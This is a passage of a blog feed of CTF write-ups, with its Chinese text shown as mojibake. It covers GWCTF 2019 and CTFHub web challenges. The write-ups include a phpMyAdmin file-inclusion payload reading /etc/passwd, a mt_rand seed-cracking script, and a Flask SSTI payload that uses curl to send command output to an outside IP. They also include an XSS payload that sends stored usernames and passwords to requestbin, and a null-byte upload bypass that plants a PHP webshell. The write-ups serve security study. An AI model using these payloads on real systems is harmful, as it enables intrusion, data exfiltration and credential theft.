    <content type="html"><![CDATA[<p>å»å¹´å®‰æ’å†³èµ›ï¼ŒåŒæ—¶è¿˜è¿›è¡Œç€GWCTï¼Œå½“æ—¶æ²¡åšï¼Œç°åœ¨å¤ç°å¤ç°ğŸ’©<a id="more"></a></p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>è€ƒå¯Ÿ[CVE-2018-12613]-PhpMyadminåå°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå‚è€ƒ<a href="https://www.jianshu.com/p/fb9c2ae16d09">è¿™é‡Œ</a>ã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æ‰«åå°å‘ç°<code>robots.txt</code>å’Œ<code>phpmyadmin</code>ä¸¤ä¸ªé¡µï¼Œè¿›å…¥<code>phpmyadmin</code>å‘ç°ç‰ˆæœ¬æ˜¯<code>4.8.1</code>çš„ï¼Œä¸Šé¢è¯´åˆ°çš„æ¼æ´åˆšå¥½æ”¯æŒçš„æ˜¯<code>4.8.0</code>å’Œ<code>4.8.1</code>ï¼Œå› æ­¤æ‹¿payloadå°è¯•ä¸€ä¸‹ï¼Œå‘ç°ç›´æ¥èƒ½æ‰“é€šï¼š</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå†æ„é€ payloadæ‹¿flagå°±è¡Œäº†ï¼š</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">index.php<span class="regexp">/?target=db_sql.php%253f/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>è€ƒå¯Ÿphpä¼ªéšæœºçš„æ¼æ´ï¼šå¦‚æœ<code>mt_srand()</code>ä½¿ç”¨åŒä¸€ä¸ª<code>seed</code>ï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥çˆ†ç ´å‡º<code>seed</code>çš„ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#div1"</span>).load(<span class="string">"check.php #p1"</span>);</span><br><span class="line">$(<span class="string">".close"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">"#myAlert"</span>).hide();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨<code>check.php</code>ï¼Œè®¿é—®è¯¥é¡µé¢å¯ä»¥æ‹¿åˆ°å¦‚ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨<code>mt_srand()</code>ï¼Œ<code>mt_rand()</code>ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”<code>session</code>æ˜¯ç”¨çš„éšæœºæ•°è®¾ç½®çš„ï¼Œé‚£ä¹ˆå…ˆå°†ä¼ªéšæœºæ•°è½¬åŒ–ä¸º<code>php_mt_seed</code>å¯è¯†åˆ«çš„æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'VJozuuy4YQ'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>ï¼ˆresï¼‰</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/gwctf05.png" alt=""></p><p>ç„¶åç”¨<code>php_mt_seed</code>çˆ†ç ´ä¼ªéšæœºæ•°ï¼š</p><p><img src="http://www.ggb0n.cool/images/gwctf01.png" alt=""></p><p>ç„¶ååˆ©ç”¨é¢˜ç›®æºç ï¼Œæ„é€ POCï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">980044562</span>);</span><br><span class="line"></span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠç»“æœè¾“å…¥å³å¯æ‹¿åˆ°flag</p><p><img src="http://www.ggb0n.cool/images/gwctf02.png" alt=""></p><h2 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h2><p>è€ƒå¯Ÿflaskçš„<code>SSTI</code>ï¼Œä»¥åŠåˆ©ç”¨<code>curl</code>åå¼¹shell</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯è¯•äº†å¥½ä¸€ä¼šå„¿æ²¡æœ‰æ•ˆæœï¼ŒæŠ“åŒ…çœ‹è¿”å›å¤´å¯ä»¥å¾—çŸ¥æ˜¯pythonçš„åç«¯ï¼Œå› æ­¤è®¤å®šæ˜¯SSTIã€‚</p><p>ç”¨<code>2</code>è¿›è¡Œæµ‹è¯•æ—¶æŠ¥é”™ï¼ŒçŒœæƒ³æ˜¯åŒæ‹¬å·è¢«banäº†ï¼Œåæ¥ç”¨<code>{}</code>ä¸<code>%</code>ç»„åˆçš„æ–¹å¼å¯ä»¥ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…³é”®è¯è¢«banäº†ï¼Œå‚è€ƒåˆ°ä¸€ä½å¸ˆå‚…çš„é¢˜è§£ï¼Œå‘ç°ä»–è®¤ä¸ºåç«¯çš„è¿‡æ»¤æ˜¯è¿™ä¹ˆå†™çš„ï¼š(åº”è¯¥æ˜¯FUZZå‡ºæ¥çš„å§)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">'import'</span>, <span class="string">'getattr'</span>, <span class="string">'os'</span>, <span class="string">'class'</span>, <span class="string">'subclasses'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">                 <span class="string">' subprocess'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'popen'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'local'</span>,</span><br><span class="line">                 <span class="string">'self'</span>, <span class="string">'item'</span>, <span class="string">'getitem'</span>, <span class="string">'getattribute'</span>, <span class="string">'func_globals'</span>, <span class="string">'config'</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p>è¿™ç§è¿‡æ»¤ï¼Œåˆ©ç”¨é»‘åå•ä¸­æœ€åä¸€ä¸ªè¯è¿›è¡Œæ··æ·†æ¥è¿‡æ»¤æ˜¯æœ€å¥½äº†ï¼Œå³<code>if=&gt;iconfigf</code>ï¼Œå› ä¸ºæ˜¯ç”¨é»‘åå•çš„å…³é”®è¯æŒ‰é¡ºåºæ¥å¯¹è¾“å…¥è¿›è¡Œæ›¿æ¢çš„ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ª<code>config</code>è¢«æ›¿æ¢ä¹‹åï¼Œè¿‡æ»¤ä¹Ÿå°±ç»“æŸäº†ã€‚</p><p>åŒæ—¶è¿˜è¦åˆ©ç”¨VPSæ¥æ¥æ”¶ç»“æœï¼Œåœ¨BUUä¸­å¼€äº†ä¸€å°å†…ç½‘é¶æœºï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#è·å–æ–‡ä»¶å</span><br><span class="line">&#123;% iconfigf ''.<span class="module-access"><span class="module"><span class="identifier">__claconfigss__</span>.</span><span class="module"><span class="identifier">__mconfigro__</span>[</span></span><span class="number">2</span>].<span class="constructor">__subclaconfigsses__()</span><span class="literal">[<span class="number">59</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http:<span class="comment">//174.0.231.221:1234/ -d `ls /`;') %&#125;1&#123;% endiconfigf %&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">#æ‹¿flag</span><br><span class="line">&#123;% iconfigf ''.<span class="module-access"><span class="module"><span class="identifier">__claconfigss__</span>.</span><span class="module"><span class="identifier">__mconfigro__</span>[</span></span><span class="number">2</span>].<span class="constructor">__subclasconfigses__()</span><span class="literal">[<span class="number">59</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http:<span class="comment">//174.0.231.221:1234/ -d `cat /flag_1s_Hera`;') %&#125;1&#123;% endiconfigf %&#125;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰“å‡ºflagï¼š</p><p><img src="http://www.ggb0n.cool/images/gwctf06.png" alt=""></p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>è€ƒå¯Ÿ<code>XSS</code></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ³¨å†Œå¹¶ç™»å½•ä¹‹åï¼Œåœ¨<code>feedback</code>é¡µé¢çœ‹åˆ°äº†ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼ŒæŸ¥çœ‹æºç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">echo <span class="string">"&lt;script&gt;alert('åé¦ˆä¸åˆæ³•');&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist =[<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line">foreach ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    $feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿé»‘åå•ä¸­çš„å†…å®¹ï¼Œåˆæ˜¯ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼ŒæŒ‡å®šæ˜¯<code>XSS</code>äº†ï¼Œå‚è€ƒåˆ«çš„å¸ˆå‚…çš„é¢˜è§£è®²åˆ°æœ¬é¢˜å­˜åœ¨<code>CSP</code>ï¼Œä¸èƒ½æ³¨å…¥å¤–éƒ¨çš„JSï¼Œé‚£è‚¯å®šå°±éœ€è¦åœ¨å†…éƒ¨JSä¸ŠåŠ¨æ‰‹è„šï¼Œé€ä¸ªé¡µé¢çœ‹æºç ï¼Œç»“æœåœ¨ç™»é™†é¡µé¢çœ‹åˆ°å­˜åœ¨<code>login.js</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line"><span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line"><span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®°ä½å¯†ç åŠŸèƒ½ä¼šä»<code>Cookie</code>ä¸­å–å‡ºç”¨æˆ·åå’Œå¯†ç å¹¶èµ‹å€¼ç»™<code>username</code>å’Œ<code>password</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå†…éƒ¨JSæ¥æ„é€ payloadè¿›è¡ŒXSSï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨BUUçš„<a href="http://http.requestbin.buuoj.cn/">requestbin</a>æ¥æ¥å—åé¦ˆã€‚</p><p>åœ¨<code>feedback</code>é¡µé¢æ„é€ å¦‚ä¸‹payloadæäº¤ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;<span class="regexp">/inpcookieut&gt;</span></span><br><span class="line"><span class="regexp">&lt;inpcookieut type="text" name="password"&gt;&lt;/i</span>npcookieut&gt;</span><br><span class="line">&lt;scricookiept scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;<span class="regexp">/scricookiept&gt;</span></span><br><span class="line"><span class="regexp">&lt;scricookiept&gt;</span></span><br><span class="line"><span class="regexp">var uname = documcookieent.getElemcookieentsByName("username")[0].value;</span></span><br><span class="line"><span class="regexp">var passwd = documcookieent.getElemcookieentsByName("password")[0].value;</span></span><br><span class="line"><span class="regexp">var res = uname + " " + passwd;</span></span><br><span class="line"><span class="regexp">documcookieent.locacookietion="http:/</span><span class="regexp">/http.requestbin.buuoj.cn/</span>?a=<span class="string">"+res;</span></span><br><span class="line"><span class="string">&lt;/scricookiept&gt;</span></span><br></pre></td></tr></table></figure><p>ç­‰ä¸€æ®µæ—¶é—´ä¹‹åï¼Œå³å¯åœ¨requestbinçœ‹åˆ°å›æ˜¾ï¼š</p><p><img src="http://www.ggb0n.cool/images/gwctf04.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å»å¹´å®‰æ’å†³èµ›ï¼ŒåŒæ—¶è¿˜è¿›è¡Œç€GWCTï¼Œå½“æ—¶æ²¡åšï¼Œç°åœ¨å¤ç°å¤ç°ğŸ’©
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="webå®‰å…¨" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BUUåˆ·é¢˜" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="phpä¼ªéšæœº" scheme="http://ggb0n.cool/tags/php%E4%BC%AA%E9%9A%8F%E6%9C%BA/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
      <category term="XSS" scheme="http://ggb0n.cool/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubéƒ¨åˆ†è®°å½•</title>
    <link href="http://ggb0n.cool/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/"/>
    <id>http://ggb0n.cool/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-03T09:57:58.000Z</published>
    <updated>2020-05-13T03:13:52.794Z</updated>
    
    <content type="html"><![CDATA[<p>æŠ€èƒ½æ ‘é‡Œå‡ é“å­¦åˆ°æ–°çŸ¥è¯†çš„é¢˜ç›®çš„è®°å½•ï¼Œè¿˜ä¸é”™è¿˜ä¸é”™ğŸ˜<a id="more"></a></p><h2 id="æŠ€èƒ½æ ‘-web-00æˆªæ–­"><a href="#æŠ€èƒ½æ ‘-web-00æˆªæ–­" class="headerlink" title="æŠ€èƒ½æ ‘-web-00æˆªæ–­"></a>æŠ€èƒ½æ ‘-web-00æˆªæ–­</h2><p>è¿™ä¸€é¢˜è€ƒå¯Ÿ<code>00</code>æˆªæ–­ï¼Œä½†æ˜¯ä¸æ˜¯å•çº¯åœ°åœ¨æ–‡ä»¶ååç¼€å¤„æˆªæ–­ï¼Œé‚£ç§æ–¹æ³•åªèƒ½ç»•è¿‡å‰ç«¯ï¼Œä½†æ˜¯æœ¬é¢˜åç«¯è¿˜ä¼šæœ‰æ£€æµ‹ï¼Œå› æ­¤éœ€è¦æ„é€ ç»•è¿‡åç«¯æ£€æµ‹çš„æˆªæ–­ã€‚<br>çœ‹åˆ°ç¾¤é‡Œæœ‰äº›å¸ˆå‚…é—®ä¸€äº›çˆ†ç ´æ–‡ä»¶åä¹‹ç±»é—®é¢˜â€¦æ„Ÿè§‰è¿˜æ˜¯å†™ä¸€ä¸‹é¢˜è§£å§ï¼Œå¸Œæœ›èƒ½æœ‰å¸®åŠ©ï¼Œè‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ã€‚ï¼ˆä¸ºäº†å†™é¢˜è§£ï¼ŒåˆèŠ±30é‡‘å¸â€¦LinEå¸ˆå‚…æ±‚æŠ¥é”€å•Šï¼‰</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‹¿åˆ°é¢˜ç›®å…ˆçœ‹çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $name = basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $info = pathinfo($name);</span><br><span class="line">    $ext = $info[<span class="string">'extension'</span>];</span><br><span class="line">    $whitelist = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des = $_GET[<span class="string">'road'</span>] . <span class="string">"/"</span> . rand(<span class="number">10</span>, <span class="number">99</span>) . date(<span class="string">"YmdHis"</span>) . <span class="string">"."</span> . $ext;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $des)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('ä¸Šä¼ æˆåŠŸ')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('ä¸Šä¼ å¤±è´¥')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æ–‡ä»¶ç±»å‹ä¸åŒ¹é…"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å®¡è®¡å¯çŸ¥ï¼Œä»£ç çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>1ã€é¦–å…ˆå–åˆ°ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å<code>$ext</code></li><li>2ã€å°†æ‰©å±•åä¸ç™½åå•è¿›è¡ŒåŒ¹é…ï¼Œä¸º<code>jpg</code>ã€<code>png</code>æˆ–<code>gif</code>æ‰èƒ½é€šè¿‡ç¬¬ä¸€æ¬¡è¿‡æ»¤</li><li>3ã€æ‰©å±•ååŒ¹é…ä¹‹åï¼Œä¸ºä¸Šä¼ çš„æ–‡ä»¶æ„é€ äº†ä¸€ä¸ªæ–°çš„å­˜å‚¨è·¯å¾„<code>$des</code>ï¼Œè¿™ä¸ªåœ°æ–¹ç”¨äº†<code>rand()</code>å‡½æ•°ï¼Œå°±çœ‹åˆ°æœ‰äº›å¸ˆå‚…é—®æ˜¯ä¸æ˜¯è¦çˆ†ç ´â€¦çœ‹åˆ°åé¢çš„<code>$ext</code>æ€ä¹ˆèƒ½æƒ³ç€çˆ†ç ´å‘¢ï¼Ÿè¿™æ˜¯æ­£å¸¸ä¸Šä¼ å›¾ç‰‡çš„å­˜å‚¨è·¯å¾„ï¼Œäººå®¶åç¼€éƒ½æ˜¯é€šè¿‡åŒ¹é…çš„<code>$ext</code>ï¼Œè‡ªå·±çš„å°é©¬è‚¯å®šæ˜¯<code>php</code>å•Šâ€¦</li></ul><p>è¿™é¢˜æ˜¯è€ƒå¯Ÿ<code>00æˆªæ–­</code>çš„ï¼Œçªç ´ç‚¹ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼šæ„é€ <code>$des</code>çš„æ—¶å€™ï¼Œé¦–å…ˆå–çš„æ˜¯<code>road</code>å‚æ•°çš„å†…å®¹<code>/var/www/html/upload/</code>ï¼Œæƒ³åˆ°çœ‹åˆ°çš„ç»•è¿‡åç«¯æ£€æµ‹çš„ä¸€ç¯‡æ–‡ç« ï¼Œéœ€è¦åœ¨å­˜å‚¨è·¯å¾„çš„åœ°æ–¹æ„é€ æˆªæ–­ï¼š<code>/var/www/html/upload/shell.php%00</code>ã€‚<br>è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼šå­˜å‚¨è·¯å¾„åé¢è¦åŠ ä¸€ä¸ª<code>php</code>åç¼€çš„æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨<code>%00</code>è¿›è¡Œæˆªæ–­ï¼Œè¿™æ ·ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹å°±å­˜åˆ°äº†<code>shell.php</code>é‡Œï¼Œè¿˜è¦æ³¨æ„è¦ç”¨<code>%00</code>æˆªæ–­ï¼Œç”±äºå†…å®¹åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç›´æ¥åœ¨<code>hex</code>ä¸­æ”¹<code>00</code>ä¼šæŠ¥bad requestã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æŠ“åŒ…æ”¹åŒ…å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub0.png" alt=""><br><img src="http://www.ggb0n.cool/images/ctfhub1.png" alt=""><br>æˆåŠŸä¸Šä¼ ï¼Œèšå‰‘è¿æ¥<code>url/var/www/html/upload/shell.php</code>å³å¯ã€‚</p><h2 id="å‘½ä»¤æ³¨å…¥-ç»¼åˆ"><a href="#å‘½ä»¤æ³¨å…¥-ç»¼åˆ" class="headerlink" 